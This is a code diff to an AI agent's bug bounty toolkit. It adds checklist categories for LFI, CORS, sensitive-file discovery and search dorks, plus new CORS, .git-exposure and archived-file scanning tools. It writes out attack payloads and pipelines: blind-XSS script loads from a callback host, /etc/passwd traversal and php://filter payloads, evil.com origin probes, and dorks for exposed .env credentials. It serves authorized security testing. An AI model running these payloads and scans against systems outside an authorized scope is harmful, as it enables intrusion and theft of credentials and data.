@@ -1,9 +1,10 @@
 // dsh-bugbounty — keyless bug bounty recon & finding toolkit for DSH.
 // Zero-import pure ESM: no @deepseek-ai/* imports; global fetch/AbortController
-// only. Registers 25 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
+// only. Registers 28 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
 // checklist, source-audit, triage, actuator, js-secrets, 403-bypass, origin-ip,
 // crlf, swagger, s3, punycode, mass-assign, email-payloads, nextjs-cve,
-// ct-fresh-assets, wordpress, cache-deception, sqli-param-hunt, waf-fingerprint)
+// ct-fresh-assets, wordpress, cache-deception, sqli-param-hunt, waf-fingerprint,
+// cors-scan, git-exposure, sensitive-files)
 // plus methodology guidance at systemPrompt
 // order 115. Exports bbApi (neutral {name, execute} map) for reuse from other
 // hosts (e.g. the OpenCode adapter).
@@ -383,9 +384,10 @@ const CHECKLIST = [
 			"Merge passive sources: subfinder -all -recursive, assetfinder --subs-only, findomain, chaos -silent",
 			"Pull subdomains from public APIs: Wayback CDX (fl=original&collapse=urlkey), crt.sh, VirusTotal, urlscan.io, CommonCrawl",
 			"Scrape GitHub repos (github-subdomains -t <token>) and Shodan (shosubgo / shodan domain <d>) for extra hosts",
-			"Map ASN/CIDR infra with asnmap -d <domain> | dnsx, amass intel -org/-cidr/-asn and correlate IPs from VT/OTX/urlscan"
+			"Map ASN/CIDR infra with asnmap -d <domain> | dnsx, amass intel -org/-cidr/-asn and correlate IPs from VT/OTX/urlscan",
+			"httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent | grep -v 404 — alive-filter live hosts across common ports on every collected subdomain"
 		],
-		techniques: ["bb_enum_subdomains", "bb_wayback_urls", "crt.sh", "HackerTarget", "RDAP/whois", "subfinder", "assetfinder", "findomain", "chaos", "github-subdomains", "shosubgo", "asnmap"]
+		techniques: ["bb_enum_subdomains", "bb_wayback_urls", "crt.sh", "HackerTarget", "RDAP/whois", "subfinder", "assetfinder", "findomain", "chaos", "github-subdomains", "shosubgo", "asnmap", "httpx-toolkit port sweep"]
 	},
 	{
 		slug: "recon-active",
@@ -474,9 +476,11 @@ const CHECKLIST = [
 			"Filter by content-type (text/html, svg, xml) with httpx-toolkit -ct to drop JSON/image noise",
 			"Auto-exploit with dalfox pipe (--skip-bav --skip-mining-all; --custom-payload, --waf-evasion, --deep-domxss)",
 			"Blind XSS: payloads in feedback/form fields + X-Forwarded-For header; OOB callbacks via dalfox --blind <collaborator>",
-			"DOM XSS: audit sinks (location, innerHTML, eval, postMessage) with --deep-domxss and manual browser confirm"
+			"DOM XSS: audit sinks (location, innerHTML, eval, postMessage) with --deep-domxss and manual browser confirm",
+			"Stored XSS mass hunt: gau/waybackurls | grep -iE '(login|signup|register|forgot|password|reset)' | nuclei -t http/xss/ -severity critical,high — stored sinks in auth/form pages",
+			"DOM XSS pipeline: Gxss -c 100 | sort -u | dalfox pipe — auto-generate payload-injected URL variants and confirm DOM/reflected execution"
 		],
-		techniques: ["bb_wayback_urls (find params)", "burp collaborator", "XSS hunter", "CSP evaluator", "gau", "gf xss", "Gxss", "kxss", "dalfox", "httpx-toolkit -ct"]
+		techniques: ["bb_wayback_urls (find params)", "burp collaborator", "XSS hunter", "CSP evaluator", "gau", "gf xss", "Gxss", "kxss", "dalfox", "httpx-toolkit -ct", "stored-XSS grep | nuclei critical,high"]
 	},
 	{
 		slug: "sqli",
@@ -526,9 +530,10 @@ const CHECKLIST = [
 			"Confirm NXDOMAIN/no content on the target while the apex is still delegated",
 			"Check takeover fingerprints: 404 from S3 bucket name, 404 NoSuchBucket era patterns",
 			"Claim the resource on free tiers and verify a file you upload is served",
-			"Report impact: phishing, cookie scope, SEO poisoning"
+			"Report impact: phishing, cookie scope, SEO poisoning",
+			"subzy run --targets <file> --concurrency 100 --hide_fails --verify_ssl — automated CNAME + fingerprint takeover verification across the subdomain list"
 		],
-		techniques: ["bb_enum_subdomains", "dig CNAME", "nuclei takeover templates", "can-i-take-over-xyz"]
+		techniques: ["bb_enum_subdomains", "dig CNAME", "nuclei takeover templates", "can-i-take-over-xyz", "subzy run --concurrency 100 --hide_fails --verify_ssl"]
 	},
 	{
 		slug: "reporting",
@@ -776,9 +781,10 @@ const CHECKLIST = [
 			"Use an all-in-one HTML payload file with double/triple URL encoding and HTML entities for hardened targets; look for any decode path firing",
 			"Scale with the pipeline subfinder -d <domain> | gau | grep '&' | bxss -appendMode -payload '<script src=https://<collab>></script>' -parameters; look for alerts on the blind-XSS dashboard",
 			"Grep site JS for 'paste' listeners reading e.clipboardData.getData('text/html') assigned to innerHTML; look for unsanitized clipboard HTML insertion",
-			"Test rich-text fields (comment editor, WYSIWYG, admin panel) by pasting attacker-copied HTML; verify CSP blocks inline scripts and paste handlers use textContent/DOMPurify"
+			"Test rich-text fields (comment editor, WYSIWYG, admin panel) by pasting attacker-copied HTML; verify CSP blocks inline scripts and paste handlers use textContent/DOMPurify",
+			"Header battery: X-Forwarded-For with blind payload (xss.collab), X-Forwarded-Host, Host, plus curl --request-target http://<collaborator>/ URL smuggling — look for OOB callbacks from admin-facing proxies and log dashboards"
 		],
-		techniques: ["header injection (UA/Referer/XFF/Host)", "EXIF Comment uploads", "Arjun hidden-param discovery", "bxss -appendMode pipeline", "clipboard paste-handler audit"]
+		techniques: ["header injection (UA/Referer/XFF/Host)", "XFF/X-Forwarded-Host/Host/--request-target battery", "EXIF Comment uploads", "Arjun hidden-param discovery", "bxss -appendMode pipeline", "clipboard paste-handler audit"]
 	},
 	{
 		slug: "waf-bypass",
@@ -928,9 +934,10 @@ const CHECKLIST = [
 			"Analyze ffuf response sizes and word counts, not just status codes; filter same-size 200 custom error pages with -fs; investigate every 403 as a bypass candidate",
 			"ffuf modes: -fc 404,500 directory fuzz; -e .php,.asp,.bak,.db,.json,.yaml extension fuzz; -H 'Host: FUZZ.example.com' vhost fuzz; clusterbomb login fuzz; -X POST -d 'FUZZ=value' API fuzz; -X PUT unauthorized writes",
 			"Route ffuf through Burp (-x http://127.0.0.1:8080) with -rate 50 -t 50; add -recursion -recursion-depth 3; fuzz custom headers -H 'X-Custom-Header: FUZZ'",
-			"5-min leg: Shodan facet bookmarklet -> nuclei -tags <cve-tags> -bs 50 -c 50 -es info; unhide bookmarklet for hidden client-side elements; lost-uncover + alienvault.sh + wayback.sh + virustotal.sh + urlscan.py --mode subdomains; gf xss|sqli|idor|ssrf|redirect | uro triage"
+			"5-min leg: Shodan facet bookmarklet -> nuclei -tags <cve-tags> -bs 50 -c 50 -es info; unhide bookmarklet for hidden client-side elements; lost-uncover + alienvault.sh + wayback.sh + virustotal.sh + urlscan.py --mode subdomains; gf xss|sqli|idor|ssrf|redirect | uro triage",
+			"ffuf -request <file> -request-proto https — replay a raw captured request (Burp copy-paste into a file, FUZZ on the target line) for LFI/XSS POST params or header-heavy endpoints"
 		],
-		techniques: ["chaos -> httpx -ip -> naabu -> nmap -> nuclei -tags cve -> ffuf", "ffuf -e extensions / -fs filters / vhost / clusterbomb / recursion", "bookmarklets (unhide, lost-uncover) + lost/ scripts", "gf | uro URL triage"]
+		techniques: ["chaos -> httpx -ip -> naabu -> nmap -> nuclei -tags cve -> ffuf", "ffuf -e extensions / -fs filters / vhost / clusterbomb / recursion", "ffuf -request raw replay", "bookmarklets (unhide, lost-uncover) + lost/ scripts", "gf | uro URL triage"]
 	},
 	{
 		slug: "sqli-recon",
@@ -992,7 +999,7 @@ const CHECKLIST = [
 		name: "WordPress Bug Hunting",
 		description: "Mastering WordPress bug hunting ('Mastering WordPress Bug Hunting'): wpscan enumeration, REST API username enumeration + bypasses, XML-RPC abuse, config/backup exposure, setup-config wizard, admin-ajax handlers.",
 		checks: [
-			"wpscan -e at -e ap -e u with aggressive plugin detection and api-token; look for known-vulnerable plugin/theme versions",
+			"wpscan --url https://target --disable-tls-checks --api-token <token> -e at -e ap -e u --plugins-detection aggressive --force; look for known-vulnerable plugin/theme versions",
 			"REST usernames via /wp-json/wp/v2/users and bypasses (?rest_route=/wp/v2/users, /index.php?rest_route=, ?per_page=100, ?search=admin, direct ID probing); look for usernames to feed brute force",
 			"Admin brute force with wpscan --username/--usernames/--passwords and XML-RPC (--max-threads 10); look for logins and system.multicall amplification",
 			"Exposed config/backup files (/wp-config.php.bak/.save/.old, /.env, /backup.zip, /db.sql, /dump.sql, /.htpasswd, /phpinfo.php); look for DB credentials or archives",
@@ -1003,7 +1010,7 @@ const CHECKLIST = [
 			"admin-ajax.php unauthenticated action handlers of plugins/themes; look for XSS or RCE via exposed callbacks",
 			"IDOR on ?post_id= style params and REST object endpoints; look for unauthorized cross-user data access"
 		],
-		techniques: ["wpscan -e at -e ap -e u", "wp-json user enum + rest_route bypasses", "xmlrpc system.multicall", "wp-config/.env/backup file probes", "setup-config.php installers"]
+		techniques: ["wpscan --url --disable-tls-checks --api-token -e at -e ap -e u --plugins-detection aggressive --force", "wp-json user enum + rest_route bypasses", "xmlrpc system.multicall", "wp-config/.env/backup file probes", "setup-config.php installers"]
 	},
 	{
 		slug: "ct-monitor",
@@ -1018,6 +1025,82 @@ const CHECKLIST = [
 			"-config custom.yaml to scope different target sets per notification preference; look for correct alert routing per group"
 		],
 		techniques: ["crtmon real-time CT monitoring", "Discord/Telegram webhook alerts", "fresh-asset httpx+nuclei race", "crt.sh json (name_value + not_before) sorting"]
+	},
+	{
+		slug: "url-collection",
+		name: "URL Collection Pipelines",
+		description: "Harvest + dedupe URL inventory across passive sources (subfinder -> httpx, gau, waybackurls, katana -ps) and normalize parameter names for downstream fuzzing. Command-line pipelines, no keys needed for the public archives.",
+		checks: [
+			"subfinder -dL domain.txt -all -silent | httpx -silent | tee sub.txt — enumerate all subdomains (passive, brute-force, resolvers) then probe for live HTTP hosts",
+			"gau --threads 5 --subs domain.com | tee gau.txt — fetch known URLs for the domain and all subdomains from public archives (Wayback, CommonCrawl, AlienVault, URLScan)",
+			"katana -ps -pss waybackarchive,commoncrawl,alienvault -d 5 -u https://target.com | tee katana.txt — JS-rendered crawl with passive source expansion for client-side-only routes",
+			"cat sub.txt | waybackurls | tee wayback.txt — Wayback Machine URL harvesting for every live host (cheap, fast, huge coverage)",
+			"cat gau.txt wayback.txt katana.txt | sort -u | urldedupe | tee url.txt — merge all archives, dedupe keeping query structure, remove duplicates",
+			"cat url.txt | sed 's/=.*/=/' | sort -u > param.txt — strip parameter values to get unique URLs with parameter names for fuzzing (param.txt is the seed list for arjun/ffuf/qsreplace)",
+			"httpx -l sub.txt -content-type -p 80,443,8080,8000,8888 -threads 200 -o content_type.txt — filter live hosts by response content-type; grep json/php/aspx to isolate API vs server-side-language targets",
+			"cat content_type.txt | grep json — focus API/JSON endpoints first; grep -E 'php|aspx|jsp' to pick server-side language targets for LFI/SQLi testing"
+		],
+		techniques: ["subfinder+httpx live-host pipeline", "gau/waybackurls/katana archive mining", "urldedupe dedup", "sed 's/=.*/=/' parameter-name extraction", "httpx -content-type filtering"]
+	},
+	{
+		slug: "sensitive-data",
+		name: "Sensitive Data & File Discovery",
+		description: "Hunt exposed files across the harvested URL inventory and search engines: configs, archives, DB dumps, key material, .git, env files, backup bundles — plus Shodan cert-CN dorks for org-owned hosts.",
+		checks: [
+			"cat url.txt | grep -E '\\.(xls|xml|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|ost|wim|rar|7z|reg|db|jar|war|git|gitignore|py|csv|rtf|jpg|png|gif|env|log|lock|key|p12|pem|der|csr|conf|cfg|ini|sqlite|sqlcipher|tar|zip|apk|apkg|whl|deb|rpm|msi|exe|dll|so|sh|php|pl|asp|aspx|jsp|jspx|do|action|java|class|mmdb|accdb|sqlite3|db3|dat|bin|hex|backup|bak)$' — grep harvested URLs for sensitive file extensions (configs, archives, DB dumps, key material)",
+			"Google dork: site:*.example.com ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:pdf OR ext:csv OR ext:txt OR ext:sql OR ext:zip OR ext:rar OR ext:tar.gz OR ext:bak OR ext:log OR ext:env OR ext:key OR ext:pem — index-of style sensitive document discovery",
+			"httpx -l sub.txt -path /.git/ -ms 'Index of' — detect exposed .git directories across live hosts; follow up with git-dumper to extract the repository",
+			"httpx -l sub.txt -path /.git/config -ms '\\[core\\]' — confirm readable .git/config for repository extraction (see bb_git_exposure)",
+			"gau --subs domain.com | grep -E '\\.(js|mjs)$' | sort -u — collect JS bundles and grep for api_key, secret, token, password, aws (see bb_js_secrets for the automated miner)",
+			"s3scanner scan --bucket-file buckets.txt — scan derived bucket names for open/listable S3 (see bb_s3_probe for the keyless probe)",
+			"Shodan dork: ssl.cert.subject.CN:example.com — find IPs/certificates issued for the org, then check port 80/443 for exposed backup files and admin panels (Shodan API key needed for the full query)"
+		],
+		techniques: ["extension-based sensitive-file grep", "Google dork ext: battery", ".git exposure httpx -ms 'Index of'", "JS bundle secret grep", "s3scanner bucket scan", "Shodan ssl.cert.subject.CN dork"]
+	},
+	{
+		slug: "lfi",
+		name: "LFI / Path Traversal",
+		description: "Local File Inclusion pipeline: harvest dynamic endpoints, inject FUZZ via qsreplace, fuzz with ffuf matching the /etc/passwd root-line signature, raw-request fuzzing, PHP wrappers and double-encoded traversal.",
+		checks: [
+			"gau domain.com | grep -E '\\.(php|asp|aspx|jsp|do|action)' | gf lfi | urldedupe | tee lfi.txt — harvest archive URLs and filter for LFI-prone dynamic endpoints",
+			"cat lfi.txt | sed 's/=.*/=/' | sort -u | qsreplace 'FUZZ' | tee lfi_fuzz.txt — strip values and replace with FUZZ marker for ffuf",
+			"ffuf -w wordlist.txt -u https://target.com/FUZZ -p 0.1 -t 10 -mr 'root:(x|\\*|\\$[^\\:]*):0:0:' -o lfi.json — match the /etc/passwd root-line signature in responses (or 'root:' for shorter)",
+			"ffuf -request lfi.txt -request-proto https -w wordlist.txt -mr 'root:' — raw-request fuzzing when the endpoint needs custom headers/cookies (copy from Burp, tweak the FUZZ line)",
+			"Test php://filter/convert.base64-encode/resource=/etc/passwd and data:// wrappers on PHP LFI params — look for base64-encoded file contents in the response",
+			"Double-encode traversal: %252e%252e%252f, %252e%252e%255c etc. to bypass filters; test both path and query injection points",
+			"Validate every hit by reading a real file (e.g. /etc/passwd root:0:0:0) — generic 'include' errors without file contents are usually not exploitable"
+		],
+		techniques: ["gau|gf lfi|uro pipeline", "qsreplace FUZZ", "ffuf -mr root: regex match", "ffuf -request raw", "php://filter wrapper", "double-encoded traversal"]
+	},
+	{
+		slug: "cors",
+		name: "CORS Misconfiguration",
+		description: "Cross-Origin Resource Sharing checks: Origin reflection, null origin, credentialed preflight, automated scanners. A reflected ACAO + Access-Control-Allow-Credentials: true + no Vary: Origin turns any authenticated endpoint into a cross-origin read.",
+		checks: [
+			"curl -H 'Origin: http://example.com' -I https://target.com/ — check Access-Control-Allow-Origin for origin reflection (baseline with a domain you don't own)",
+			"Reflection test: if ACAO echoes the Origin header verbatim, the app reflects arbitrary origins — retest with https://evil.com and check Access-Control-Allow-Credentials: true",
+			"curl -H 'Origin: null' -I https://target.com/ — null origin (sandboxed iframes, data: URIs) is attacker-controllable; flag ACAO: null + ACAC: true",
+			"curl -X OPTIONS -H 'Origin: http://evil.com' -H 'Access-Control-Request-Method: GET' -I https://target.com/ — preflight reveals ACAO/ACAC for credentialed cross-origin requests (see bb_cors_scan)",
+			"python3 CORScanner.py -u https://target.com -d -t 10 — automated CORS misconfiguration scanner (checks multiple origins + credentials)",
+			"nuclei -t nuclei-templates/vulnerabilities/cors/ -l targets.txt — template-based CORS checks across the target list",
+			"Impact check: ACAO reflects attacker origin + Access-Control-Allow-Credentials: true + no Vary: Origin — any authenticated endpoint becomes readable cross-origin; confirm with a credentialed fetch from an attacker page"
+		],
+		techniques: ["Origin reflection curl", "null-origin test", "OPTIONS preflight", "CORScanner", "nuclei cors templates"]
+	},
+	{
+		slug: "google-dorks",
+		name: "Google / Shodan Dorks",
+		description: "Search-engine recon: ext: dorks for sensitive docs, intitle:index of for directory listings, inurl:.env/config for exposed settings, default-server title dorks for unhardened hosts, Shodan cert-CN and title dorks for org inventory.",
+		checks: [
+			"site:*.example.com ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:pdf OR ext:csv OR ext:txt OR ext:sql OR ext:zip OR ext:env OR ext:key OR ext:pem — find sensitive indexed documents (see sensitive-data category)",
+			"intitle:'index of' site:example.com — directory listings indexed by Google; also try inurl:admin, inurl:backup, inurl:config, inurl:uploads for listing-prone paths",
+			"inurl:.env intext:APP_KEY OR intext:DB_PASSWORD site:example.com — exposed environment/config files with credential strings in the body",
+			"intitle:'Welcome to nginx!' OR intitle:'Apache2 Ubuntu Default Page' OR intitle:'IIS Windows Server' — default server pages reveal unhardened hosts (also check /server-status, /phpinfo.php on hits)",
+			"Shodan dork: ssl.cert.subject.CN:example.com — enumerate hosts by certificate CN; filter port 443 + status 200 for live org-owned services",
+			"Shodan dork: http.title:'login' hostname:example.com — find login portals by page title; combine with http.html:password for exposed login forms",
+			"Dork hygiene: validate every hit with httpx before manual testing; Google results lag real exposure, so pair dorks with bb_wayback_urls + bb_ct_fresh_assets for fresher inventory"
+		],
+		techniques: ["site: ext: dork battery", "intitle:'index of' dorks", "inurl:.env/config dorks", "default-server title dorks", "Shodan ssl.cert.subject.CN", "Shodan http.title login"]
 	}
 ];
 
@@ -1696,7 +1779,7 @@ const TOOLS = [
 	},
 	{
 		name: "bb_checklist",
-		description: "Bug bounty methodology checklist (40 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
+		description: "Bug bounty methodology checklist (45 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
 		parameters: {
 			type: "object",
 			additionalProperties: false,
@@ -2978,6 +3061,234 @@ const TOOLS = [
 			}
 			return out;
 		}
+	},
+	{
+		name: "bb_cors_scan",
+		description: "CORS misconfiguration scan: send GET + OPTIONS preflight with attacker-controlled origins (evil.com, null, sibling subdomain) and detect Access-Control-Allow-Origin reflection, wildcard-with-credentials and missing Vary: Origin. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: { url: { type: "string", description: "Full URL to scan, e.g. https://target.com/api/account" } },
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					origins_tests: { type: "array", items: { type: "object", properties: { origin: { type: "string" }, method: { type: "string" }, status: { type: "integer" }, acao: { type: "string" }, acac: { type: "string" }, vary: { type: "string" }, reflected: { type: "boolean" } }, required: ["origin", "method", "status", "acao", "acac", "vary", "reflected"], additionalProperties: false } },
+					findings: { type: "array", items: { type: "string" } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url", "origins_tests", "findings", "summary"]
+			},
+			render: (_args, v) =>
+				renderLines("🌐 bb_cors_scan " + v.url, [
+					v.summary,
+					...(v.findings.length ? v.findings : ["no CORS misconfiguration detected"]),
+					"tests: " + v.origins_tests.map((t) => `${t.origin} (${t.method}) -> ${t.acao || "no ACAO"}`).join(" | ")
+				])
+		},
+		timeoutMs: 25000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const out = { url: String(args.url || ""), origins_tests: [], findings: [], summary: "", error: "" };
+			try {
+				const base = normalizeUrl(args.url);
+				const host = new URL(base).host;
+				const origins = ["https://evil.com", "null", "https://sub." + host];
+				const run = async (method, origin) => {
+					const headers = { origin };
+					if (method === "OPTIONS") headers["access-control-request-method"] = "GET";
+					try {
+						let res;
+						if (method === "GET") {
+							const r = await fetchRes(base, exec, { budget: 8000, redirect: "manual", headers });
+							res = r.res;
+						} else {
+							const b = withBudget(exec, 8000);
+							try {
+								res = await fetch(base, { method, signal: b.signal, redirect: "manual", headers: { "user-agent": UA, accept: "*/*", ...headers } });
+							} finally {
+								b.dispose();
+							}
+						}
+						await readLimited(res, 200);
+						const acao = res.headers.get("access-control-allow-origin") || "";
+						const acac = res.headers.get("access-control-allow-credentials") || "";
+						const vary = res.headers.get("vary") || "";
+						let reflected = acao !== "" && acao !== "*" && (acao === origin || (origin !== "null" && acao.includes(new URL(origin).hostname)));
+						return { origin, method, status: res.status, acao, acac, vary, reflected };
+					} catch {
+						return { origin, method, status: 0, acao: "", acac: "", vary: "", reflected: false };
+					}
+				};
+				for (const origin of origins) {
+					out.origins_tests.push(await run("GET", origin));
+					out.origins_tests.push(await run("OPTIONS", origin));
+				}
+				for (const t of out.origins_tests) {
+					if (t.reflected && t.acac === "true") out.findings.push(`reflected origin ${t.origin} + Access-Control-Allow-Credentials: true (${t.method}) — credentialed cross-origin read possible`);
+					else if (t.reflected) out.findings.push(`origin reflected verbatim: ${t.origin} (${t.method})`);
+					else if (t.acao === "*" && t.acac === "true") out.findings.push(`wildcard ACAO: * with credentials (${t.method}) — invalid per spec`);
+				}
+				if (out.origins_tests.some((t) => t.reflected) && !out.origins_tests.some((t) => /origin/i.test(t.vary))) {
+					out.findings.push("reflected ACAO without Vary: Origin — cacheable cross-origin responses");
+				}
+				out.summary = out.findings.length
+					? `${out.findings.length} CORS finding(s) — ${out.findings[0]}`
+					: "no CORS misconfiguration detected";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_git_exposure",
+		description: "Detect exposed .git repositories: probe /.git/HEAD, /.git/config, /.git/index, /.git/logs/HEAD and refs for readable markers (ref:, [core], DIRC) plus directory-listing signs on /.git/. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: { url: { type: "string", description: "Base URL to scan, e.g. https://target.com" } },
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					checks: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, marker: { type: "string" } }, required: ["path", "status", "marker"], additionalProperties: false } },
+					findings: { type: "array", items: { type: "string" } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url", "checks", "findings", "summary"]
+			},
+			render: (_args, v) =>
+				renderLines("🔓 bb_git_exposure " + v.url, [
+					v.summary,
+					...(v.findings.length ? v.findings : ["no .git exposure detected"]),
+					"probes: " + v.checks.map((c) => `${c.path} -> ${c.status}${c.marker ? " (" + c.marker + ")" : ""}`).join(" | ")
+				])
+		},
+		timeoutMs: 25000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const out = { url: String(args.url || ""), checks: [], findings: [], summary: "", error: "" };
+			try {
+				const base = normalizeUrl(args.url).replace(/\/+$/, "");
+				const probes = [
+					["/.git/HEAD", "ref:"],
+					["/.git/config", "[core]"],
+					["/.git/index", "DIRC"],
+					["/.git/logs/HEAD", "0000000"],
+					["/.git/refs/heads/main", "ref:"]
+				];
+				for (const [p, marker] of probes) {
+					let status = 0;
+					let body = "";
+					try {
+						const { res } = await fetchRes(base + p, exec, { budget: 8000 });
+						status = res.status;
+						body = await readLimited(res, 400);
+					} catch {
+						status = 0;
+					}
+					const hit = status === 200 && marker && body.includes(marker);
+					out.checks.push({ path: p, status, marker: hit ? marker : "" });
+					if (hit) out.findings.push(`${p} readable (200, contains "${marker}") — .git repository exposed`);
+				}
+				let listStatus = 0;
+				let listBody = "";
+				try {
+					const { res } = await fetchRes(base + "/.git/", exec, { budget: 8000 });
+					listStatus = res.status;
+					listBody = await readLimited(res, 300);
+				} catch {
+					listStatus = 0;
+				}
+				const listing = /index of|directory listing/i.test(listBody);
+				out.checks.push({ path: "/.git/", status: listStatus, marker: listing ? "Index of" : "" });
+				if (listing) out.findings.push("/.git/ returns an index listing — dump with git-dumper");
+				out.summary = out.findings.length
+					? `${out.findings.length} exposure sign(s) — ${out.findings[0]}`
+					: "no .git exposure detected";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_sensitive_files",
+		description: "Mine archived URLs (Wayback CDX) for sensitive file extensions: configs, archives, key material, DB dumps, backups, env files and source bundles; grouped by extension. Keyless: CDX API.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				domain: { type: "string", description: "Domain to mine, e.g. example.com" },
+				limit: { type: "integer", description: "Max URLs to return (default 60)" }
+			},
+			required: ["domain"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					domain: { type: "string" },
+					matches: { type: "array", items: { type: "string" } },
+					by_extension: { type: "object", additionalProperties: true },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["domain", "matches", "by_extension", "summary"]
+			},
+			render: (_args, v) =>
+				renderLines("📁 bb_sensitive_files " + v.domain, [
+					v.summary,
+					...(v.matches.length ? v.matches : ["no sensitive files found in archives"]),
+					"by extension: " + Object.entries(v.by_extension).map(([e, n]) => e + "=" + n).join(" ")
+				])
+		},
+		timeoutMs: 45000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const domain = normalizeDomain(args.domain);
+			const limit = Math.min(Math.max(Number(args.limit) || 60, 1), 200);
+			const out = { domain, matches: [], by_extension: {}, summary: "", error: "" };
+			try {
+				const { urls, error } = await cdxUrls(domain, exec, { cap: 800 });
+				if (error) out.error = error;
+				const EXTS = ["xls", "xml", "json", "pdf", "sql", "doc", "docx", "pptx", "txt", "zip", "tar.gz", "tgz", "bak", "ost", "wim", "rar", "7z", "reg", "db", "jar", "war", "git", "gitignore", "py", "csv", "rtf", "env", "log", "lock", "key", "p12", "pem", "der", "csr", "conf", "cfg", "ini", "sqlite", "sqlcipher", "apk", "apkg", "whl", "deb", "rpm", "msi", "exe", "dll", "so", "sh", "mmdb", "accdb", "sqlite3", "db3", "dat", "bin", "hex", "backup"];
+				const re = new RegExp("\\.(" + EXTS.map((e) => e.replace(/\./g, "\\.")).join("|") + ")([?#].*)?$", "i");
+				const seen = new Set();
+				for (const u of urls) {
+					let path;
+					try {
+						path = new URL(u).pathname;
+					} catch {
+						continue;
+					}
+					if (!re.test(path)) continue;
+					const clean = u.split(/[?#]/)[0];
+					if (seen.has(clean)) continue;
+					seen.add(clean);
+					out.matches.push(clean);
+					const ext = (path.match(/\.([a-z0-9]+)$/i) || [])[1] || "?";
+					out.by_extension[ext] = (out.by_extension[ext] || 0) + 1;
+				}
+				out.matches = out.matches.slice(0, limit);
+				const exts = Object.entries(out.by_extension).sort((a, b) => b[1] - a[1]).map(([e, n]) => e + "x" + n).join(", ");
+				out.summary = out.matches.length
+					? `${out.matches.length} sensitive file(s) from ${urls.length} archived URLs (${exts})`
+					: `no sensitive files in ${urls.length} archived URLs`;
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
 	}
 ];
 
@@ -2989,7 +3300,7 @@ const GUIDANCE = [
 	"- bb_tech_detect(url) — fingerprint the tech stack from headers, cookies and HTML (WordPress, Next.js, Nuxt, Drupal, Joomla, React, jQuery, nginx, IIS, Cloudflare, ...).",
 	"- bb_wayback_urls(domain, limit?) — archived URLs from the Wayback CDX API; flags interesting endpoints/params (id, file, redirect, token, auth, download, cmd, admin, api, .env, .git, swagger, graphql).",
 	"- bb_recon(domain) — one-shot pipeline: enum -> probe -> tech detect -> header audit; returns live hosts + findings (missing headers, leaks, cookie flags, http-only hosts).",
-	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (40 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
+	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (45 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
 	"- bb_actuator_scan(url) — probe Spring Boot Actuator endpoints (/actuator/env, /heapdump, /jolokia, ...) for exposed internals, high-risk hits and default config.",
